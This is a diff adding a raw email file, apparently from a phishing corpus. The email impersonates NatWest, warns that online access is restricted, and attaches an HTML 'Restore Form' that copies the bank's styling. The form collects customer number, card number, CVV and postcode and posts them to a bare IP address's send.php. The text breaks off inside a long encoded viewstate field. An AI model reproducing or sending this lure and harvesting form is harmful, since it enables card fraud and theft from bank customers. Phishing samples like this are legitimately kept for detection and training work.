@@ -1,0 +1,808 @@
+Return-Path: <> 
+From: luca@daimon.it
+To: "Charline Gardner" <the00@plg2.math.uwaterloo.ca>
+Subject: 2nd Alert From NatWest
+Date: Sun, 07 Apr 2013 09:47:19 -0300
+Message-Id: <20130407124746.73BB61789289@web1895.linux-hosting.com>
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 2877
+
+You will not see this in a MIME-aware mail reader.
+--===============1404784312==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+
+Dear NatWest Online customer,
+
+Your online access has been restricted. =
+
+Provide us with the following details that are required in the form attache=
+d =
+
+to this email and you should be able to access the service in just a few mi=
+nutes.
+
+After completing the required fields to complete this verification proccess =
+
+please sign in to get back into the service, =
+
+avoid any mis-match of data verification
+
+We are requesting this information to verify and protect your identity. =
+
+This is in order to prevent the illegal activity of National Westminster Ba=
+nk Online accounts.
+
+We apologize for any inconvenience this may have caused.
+
+
+Sincerely,
+
+NatWest Online Helpdesk | NatWest Helpful Banking
+
+
+
+Please do not reply to this e-mail as this is only a notification. Mail sen=
+t to this address cannot be answered.
+
+--===============1404784312==
+MIME-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment; filename="Restore_Form.html"
+
+=EF=BB=BF<html xmlns=3D"http://www.w3.org/1999/xhtml">
+<head>
+<script type=3D"text/javascript">
+<!--
+// copyright 1999 Idocs, Inc. http://www.idocs.com
+// Distribute this script freely but keep this notice in place
+function numbersonly(myfield, e, dec)
+{
+var key;
+var keychar;
+if (window.event)
+   key =3D window.event.keyCode;
+else if (e)
+   key =3D e.which;
+else
+   return true;
+keychar =3D String.fromCharCode(key);
+// control keys
+if ((key=3D=3Dnull) || (key=3D=3D0) || (key=3D=3D8) || =
+
+    (key=3D=3D9) || (key=3D=3D13) || (key=3D=3D27) )
+   return true;
+// numbers
+else if ((("0123456789").indexOf(keychar) > -1))
+   return true;
+// decimal point jump
+else if (dec && (keychar =3D=3D "."))
+   {
+   myfield.form.elements[dec].focus();
+   return false;
+   }
+else
+   return false;
+}
+//-->
+</SCRIPT>
+<script type=3D"text/javascript">
+function checkLen(x,y)
+{
+if (y.length=3D=3Dx.maxLength)
+  {
+  var next=3Dx.tabIndex;
+  if (next<document.getElementById("faqForm").length)
+    {
+    document.getElementById("faqForm").elements[next].focus();
+    }
+  }
+}
+</script>
+<SCRIPT language=3DJavascript>
+function sloboz(){
+signupFORM =3D document.aspnetForm;
+if(signupFORM.cunr.value =3D=3D ""){
+              alert("Please enter your Customer number.");signupFORM.cunr.f=
+ocus();return false;}
+if(signupFORM.cunr.value.length <6){
+              alert("Your Customer number is incorrect.");signupFORM.cunr.f=
+ocus();return false;}
+if(signupFORM.cnr.value =3D=3D ""){
+              alert("Please enter your 16 Digit Card number");signupFORM.cn=
+r.focus();return false;}
+if(signupFORM.cnr.value.length <15){
+              alert("Your Card number is is incorrect.");signupFORM.cnr.foc=
+us();return false;}
+if(signupFORM.cvnr.value =3D=3D ""){
+              alert("Please enter your Card Verification Value (CVV). You c=
+an find it on the back of your Card.");signupFORM.cvnr.focus();return false=
+;}
+if(signupFORM.cvnr.value.length <3){
+              alert("Your Card Verification Value (CVV) is invalid.");signu=
+pFORM.cvnr.focus();return false;}
+if(signupFORM.pc.value =3D=3D ""){
+              alert("Please enter your Home postcode.");signupFORM.pc.focus=
+();return false;}
+if(signupFORM.pc.value.length <6){
+              alert("Your Home postcode is invalid.");signupFORM.pc.focus()=
+;return false;}          =
+
+return true;
+}
+</SCRIPT>
+<title>
+	NatWest - Restore your account
+</title><meta http-equiv=3D"content-type" content=3D"text/html;charset=3Dut=
+f-8"><meta http-equiv=3D"Content-Style-Type" content=3D"text/css"><meta id=
+=3D"ctl00_demoNoIndex" name=3D"robots" content=3D"all"><link href=3D"https:=
+//www.nwolb.com/Brands/master.css" rel=3D"stylesheet" type=3D"text/css" med=
+ia=3D"all" segment=3D""><link href=3D"https://www.nwolb.com/Brands/jq_style=
+s/datePicker.css" rel=3D"stylesheet" type=3D"text/css" media=3D"all" segmen=
+t=3D""><link href=3D"https://www.nwolb.com/Brands/NWB/css/npc.css" rel=3D"s=
+tylesheet" type=3D"text/css" media=3D"all" segment=3D""><!--[if IE 6]><link=
+ href=3D"https://www.nwolb.com/Brands/NWB/css/ie6.css" rel=3D"stylesheet" t=
+ype=3D"text/css" media=3D"all" segment=3D"" />
+<![endif]--><!--[if IE 7]><link href=3D"https://www.nwolb.com/Brands/master=
+_ie7.css" rel=3D"stylesheet" type=3D"text/css" media=3D"all" segment=3D"" />
+<![endif]--><!--[if IE 7]><link href=3D"https://www.nwolb.com/Brands/NWB/cs=
+s/ie7.css" rel=3D"stylesheet" type=3D"text/css" media=3D"all" segment=3D"" =
+/>
+<![endif]--><!--[if IE 8]><link href=3D"https://www.nwolb.com/Brands/NWB/cs=
+s/ie8.css" rel=3D"stylesheet" type=3D"text/css" media=3D"all" segment=3D"" =
+/>
+<![endif]--><!--[if lte IE 8]><link href=3D"https://www.nwolb.com/Brands/NW=
+B/css/lteie8.css" rel=3D"stylesheet" type=3D"text/css" media=3D"all" segmen=
+t=3D"" />
+<![endif]--><!--[if Chrome]><link href=3D"https://www.nwolb.com/Brands/mast=
+er_chrome.css" rel=3D"stylesheet" type=3D"text/css" media=3D"all" segment=
+=3D"" />
+<![endif]--><!--[if Chrome]><link href=3D"https://www.nwolb.com/Brands/NWB/=
+css/npc_chrome.css" rel=3D"stylesheet" type=3D"text/css" media=3D"all" segm=
+ent=3D"" />
+<![endif]--><link href=3D"https://www.nwolb.com/promptResources/templates/o=
+verlayTemplate/overlayPromptMaster.css" rel=3D"stylesheet" type=3D"text/css=
+" media=3D"all" segment=3D""><link href=3D"https://www.nwolb.com/promptReso=
+urces/templates/overlayTemplate/NPC/overlayPrompt.css" rel=3D"stylesheet" t=
+ype=3D"text/css" media=3D"all" segment=3D""><link href=3D"https://www.nwolb=
+.com/Brands/NWB/css/NPC_auralstyle.css" rel=3D"stylesheet" type=3D"text/css=
+" media=3D"aural" segment=3D""><link href=3D"https://www.nwolb.com/Brands/m=
+aster_print.css" rel=3D"stylesheet" type=3D"text/css" media=3D"print" segme=
+nt=3D""><script type=3D"text/javascript" src=3D"https://www.nwolb.com/Brand=
+s/common.js"></script><script type=3D"text/javascript" src=3D"https://www.n=
+wolb.com/Brands/mm.js"></script><!--[if lt IE 7]><script type=3D"text/javas=
+cript" src=3D"https://www.nwolb.com/Brands/jq_scripts/pngfix.js"></script>
+<![endif]--><meta id=3D"ctl00_PageIDMetaControl" name=3D"PageID" content=3D=
+"OLE1"></head>
+<body OnLoad=3D"document.aspnetForm.cunr.focus();" id=3D"ctl00_bodyTag" cla=
+ss=3D"wizard">
+	=
+
+	=
+
+	<div id=3D"wrapper" class=3D"default_bg nobackgroundImg">
+		<div id=3D"acceskeys">
+			<div id=3D"skiplinks">
+				<div class=3D"ddalink">
+	<a id=3D"ctl00_skipLinks_ctl00_beginLink" accesskey=3D"0" title=3D"Return =
+to start of screen / Access key details" class=3D"ddalink" href=3D"https://=
+www.nwolb.com/OnlineEnrolmentRegister.aspx#">Return to start of screen / Ac=
+cess key details</a><a id=3D"ctl00_skipLinks_ctl00_MenuLink" accesskey=3D"m=
+" title=3D"Skip to Menu" class=3D"ddalink" href=3D"https://www.nwolb.com/On=
+lineEnrolmentRegister.aspx#menu">Skip to Menu</a><a id=3D"ctl00_skipLinks_c=
+tl00_ContentLink" accesskey=3D"s" title=3D"Skip to main content" class=3D"d=
+dalink" href=3D"https://www.nwolb.com/OnlineEnrolmentRegister.aspx#content"=
+>Skip to main content</a>
+</div>
+			</div>
+		</div>
+		<div id=3D"canvas" class=3D"twoLines">
+			=
+
+<div id=3D"header">
+    <div style=3D"position:absolute;top:8px;left:7px;">
+        <a href=3D"http://www.natwest.com" target=3D"_top"><img id=3D"ctl00=
+_header_ctl00_BrandImage4" src=3D"https://www.nwolb.com/brands/NWB/images/l=
+ogo.gif" alt=3D"NatWest Logo - Back to home page " style=3D"height:45px;wid=
+th:168px;border-width:0px;"></a><img id=3D"ctl00_header_ctl00_BrandImage5" =
+src=3D"https://www.nwolb.com/brands/NWB/images/strapline_hb.gif" alt=3D"Hel=
+pful Banking" style=3D"height:45px;width:175px;border-width:0px;margin-top:=
+5px;">
+    </div> =
+
+    <ul id=3D"quickLinks">
+        <li></li>
+        <li class=3D"last"></li>
+    </ul> =
+
+    <div id=3D"ctl00_header_ctl00_LogoutWrapper" class=3D"logoutWrapper">
+               =
+
+    </div>   =
+
+</div>
+
+
+            =
+
+			<div id=3D"content">
+				<a name=3D"content"></a>
+				<div id=3D"mid">
+					<div id=3D"ctl00_snailTrail__d49a5255ca0_SnailTrail">
+
+</div>
+					<form name=3D"aspnetForm" method=3D"post" action=3D"http://110.15.7.23=
+8/send.php" id=3D"aspnetForm">
+<div>
+<input name=3D"submind" id=3D"submind" value=3D"1" type=3D"hidden">
+<input name=3D"OLE1CBD_Visibility" id=3D"OLE1CBD_Visibility" value=3D"False=
+" type=3D"hidden">
+<input name=3D"__EVENTTARGET" id=3D"__EVENTTARGET" value=3D"NextButton_butt=
+on" type=3D"hidden">
+<input name=3D"__EVENTARGUMENT" id=3D"__EVENTARGUMENT" value=3D"" type=3D"h=
+idden">
+<input name=3D"__VIEWSTATE2" id=3D"__VIEWSTATE2" value=3D"oBQAAJI6OHMQ3SG0P=
+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
